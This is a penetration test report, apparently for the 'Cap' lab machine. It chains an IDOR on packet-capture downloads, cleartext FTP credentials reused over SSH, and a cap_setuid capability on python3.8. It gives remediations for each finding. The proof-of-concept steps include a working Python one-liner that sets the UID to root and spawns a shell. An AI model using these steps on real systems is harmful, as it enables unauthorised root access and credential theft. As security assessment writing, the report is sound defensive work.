## Executive Summary

A comprehensive penetration test was conducted on the **Cap** Linux target. The primary objective was to evaluate the application's security posture, identify potential vulnerabilities, and assess the impact of exploitation on business operations. 

During the assessment, three high-impact vulnerabilities were identified and chained together, allowing an attacker to escalate privileges from an unauthenticated network observer to full system administrator (`root`). Immediate remediation is required to secure the application and host environment.

## Detailed Vulnerability Findings & Remediation

### Finding CAP-01: Insecure Direct Object Reference (IDOR) on PCAP Endpoint

* **Severity:** High  
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (**7.5**)  
* **Vulnerable Endpoint:** `http://<TARGET_IP>/data/[id]`  

#### Description
The web application provides a "Security Snapshot" feature that records network packet captures (`.pcap`) and assigns them a sequential numerical identifier (e.g., `/data/1`). The application fails to validate whether the requesting user owns the requested packet capture. By manipulating the path parameter from `/data/1` to `/data/0`, an unauthenticated user can access and download historical network packet captures generated by other sessions.

#### Technical Proof of Concept
1. Navigate to the web application dashboard at `http://<TARGET_IP>/`.
2. Initiate a security capture; observe the redirection to `http://<TARGET_IP>/data/1`.
3. Modify the identifier in the address bar to `http://<TARGET_IP>/data/0` to retrieve the packet capture file (`0.pcap`) belonging to another user context.

#### Remediation & Mitigation
* **Access Controls:** Implement strict session-based authorization checks ensuring users can only download packet captures generated within their active session.
* **Use Cryptographic Identifiers:** Replace sequential numerical IDs (`0`, `1`, `2`) with cryptographically secure pseudo-random identifiers (UUIDv4) to prevent path enumeration.

### Finding CAP-02: Transmission of Cleartext Credentials via Unencrypted Protocol (FTP)

* **Severity:** High  
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (**7.5**)  
* **Vulnerable Service:** FTP (TCP Port 21) / Wireshark Protocol Analysis  

#### Description
The target system uses standard File Transfer Protocol (FTP) without transport layer encryption. User authentication traffic—including usernames and passwords—is transmitted in plain text. Analysis of the exfiltrated packet capture (`0.pcap`) revealed unencrypted FTP authentication packets containing valid user credentials (`nathan`). Furthermore, password reuse allowed these credentials to be successfully leveraged against the SSH service (TCP Port 22).

#### Technical Proof of Concept
1. Open the extracted capture file (`0.pcap`) in Wireshark:
   ```bash
   wireshark 0.pcap &

```

2. Apply the display filter `ftp`.
3. Inspect the `USER` and `PASS` requests to extract the plaintext credentials for user `nathan`.
4. Authenticate to the system over SSH using the harvested credentials:
```bash
ssh nathan@<TARGET_IP>

```



#### Remediation & Mitigation

* **Disable Plaintext Protocols:** Deprecate unencrypted FTP in favor of Secure File Transfer Protocol (SFTP) over SSH or FTPS (FTP over TLS).
* **Enforce Password Policies:** Implement strict organization-wide policies preventing password reuse across different protocol interfaces and services.

### Finding CAP-03: Insecure Privilege Assignment via Excess Binary Capabilities (`cap_setuid`)

* **Severity:** Critical
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` (**8.8**)
* **Vulnerable Binary:** `/usr/bin/python3.8`

#### Description

The Python 3.8 interpreter on the host has been assigned the `cap_setuid` Linux Capability (`cap_setuid,cap_net_bind_service+eip`). This configuration grants any low-privileged user executing Python the ability to arbitrary manipulate its own Process User ID (UID) and assume UID `0` (`root`), bypassing standard SUID bit checks and `sudo` controls.

#### Technical Proof of Concept

1. Enumerate file capabilities across the local filesystem:
```bash
getcap -r / 2>/dev/null

```


*Output:* `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`
2. Execute the Python interpreter to modify the process UID to `0` and spawn a root shell:
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```


3. Verify privilege escalation:
```bash
id
# Output: uid=0(root) gid=0(root) groups=0(root)

```



#### Remediation & Mitigation

* **Remove Unnecessary Capabilities:** Strip the `cap_setuid` capability from public interpreters using the `setcap` utility:
```bash
sudo setcap -r /usr/bin/python3.8

```


* **Principle of Least Privilege:** Restrict capability assignments to specific dedicated binaries rather than general-purpose script interpreters.

---

## Strategic Recommendations

1. **Conduct Routine Access Audits:** Perform periodic system audits utilizing tools like `getcap -r /` and `find / -perm -4000` to detect unauthorized binary capabilities or elevated permissions.
2. **Implement Network Segmentation & TLS Encryption:** Ensure all internal and external communication channels enforcing authentication utilize TLS encapsulation.
3. **Enhance Code Review Guidelines:** Audit custom web application endpoints to ensure parameters controlling resource access are validated against authorization matrices.
